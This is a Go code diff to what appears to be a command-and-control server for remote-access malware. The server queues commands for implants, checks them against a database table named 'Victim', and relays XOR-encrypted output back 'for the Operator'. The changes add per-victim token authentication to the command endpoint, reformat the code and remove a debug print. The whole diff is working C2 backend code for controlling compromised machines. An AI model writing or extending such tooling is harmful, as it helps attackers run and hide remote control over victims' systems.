@@ -1,6 +1,7 @@
 package main
 
 import (
+	"database/sql"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -15,46 +16,74 @@ var (
 )
 
 func getCommand(w http.ResponseWriter, r *http.Request) {
-    defer r.Body.Close()
+	defer r.Body.Close()
 
-    // Set the response content type to JSON
-    w.Header().Set("Content-Type", "application/json")
+	// Set the response content type to JSON
+	w.Header().Set("Content-Type", "application/json")
 
-    // Define a switch statement to handle GET or POST requests
-    switch r.Method {
-    case "GET":
-        // If the request is a GET request, we lock the Mutex to access the command
-        mu.RLock()
-        defer mu.RUnlock()
+	// Extract the token and username from the query parameters
+	receivedToken := r.URL.Query().Get("token")
+	username := r.URL.Query().Get("user")
+	if receivedToken == "" || username == "" {
+		http.Error(w, "Token and User are required", http.StatusBadRequest)
+		return
+	}
 
-        // Check if there is a command that has not been released
-        if storedCommand == nil {
-            http.Error(w, "No command available", http.StatusNotFound)
-            return
-        }
+	// Retrieve the token from the database associated with the username
+	var dbToken string
+	err := db.QueryRow("SELECT token FROM Victim WHERE username = ?", username).Scan(&dbToken)
+	if err != nil {
+		if err == sql.ErrNoRows {
+			http.Error(w, "User not found", http.StatusNotFound)
+			return
+		}
+		http.Error(w, "Database error", http.StatusInternalServerError)
+		return
+	}
 
-        // Marshal the command to JSON
-        jsonCommand, err := json.Marshal(storedCommand)
-        if err != nil {
-            http.Error(w, err.Error(), http.StatusInternalServerError)
-            return
-        }
+	// Check if the received token matches the token from the database
+	if receivedToken != dbToken {
+		http.Error(w, "Invalid token", http.StatusUnauthorized)
+		return
+	}
 
-        w.WriteHeader(http.StatusOK)
+	// Define a switch statement to handle GET requests
+	switch r.Method {
+	case "GET":
+		// If the request is a GET request, we lock the Mutex to access the command
+		mu.RLock()
+		defer mu.RUnlock()
 
-        // Write the JSON command to the response
-        if _, err := w.Write(jsonCommand); err != nil {
-            http.Error(w, err.Error(), http.StatusInternalServerError)
-            return
-        }
+		// Check if there is a command that has not been released
+		if storedCommand == nil {
+			http.Error(w, "No command available", http.StatusNotFound)
+			return
+		}
 
-        // Since the command is "consumed", set storedCommand to nil
-        storedCommand = nil
+		// Marshal the command to JSON
+		jsonCommand, err := json.Marshal(storedCommand)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			return
+		}
 
-    default:
-        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-        return
-    }
+		w.WriteHeader(http.StatusOK)
+
+		// Write the JSON command to the response
+		if _, err := w.Write(jsonCommand); err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			return
+		}
+
+		// Since the command is "consumed", set storedCommand to nil
+
+	default:
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	// Reset storedCommand after successful retrieval
+	storedCommand = nil
 }
 
 func postCommand(w http.ResponseWriter, r *http.Request) {
@@ -109,8 +138,6 @@ func getOutput(w http.ResponseWriter, r *http.Request) {
 	// We first unlock the stored mutex which holdes the Output struct and put it inside a variable
 	bufferMutex.Lock()
 	output := outputBuffer
-
-	fmt.Println(string(output))
 
 	// Then we send off the XOR encrypted output for the Operator
 	w.Header().Set("Content-Type", "application/octet-stream")
